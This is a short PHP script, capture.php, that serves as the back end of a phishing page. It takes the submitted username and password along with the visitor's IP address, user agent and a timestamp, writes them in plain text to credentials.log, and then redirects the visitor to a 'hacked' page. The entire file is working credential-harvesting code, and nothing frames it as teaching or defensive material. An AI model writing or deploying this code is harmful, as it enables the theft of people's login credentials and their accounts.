<?php
// capture.php - Captures credentials and redirects to hacked page

// Get visitor information
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');
$username = $_POST['username'];
$password = $_POST['password'];

// Log credentials to file
$log_entry = "[$timestamp] IP: $ip | Username: $username | Password: $password | User-Agent: $user_agent\n";

// Append to log file
file_put_contents('credentials.log', $log_entry, FILE_APPEND | LOCK_EX);

// Redirect to hacked page
header('Location: hacked.html');
exit();
?>
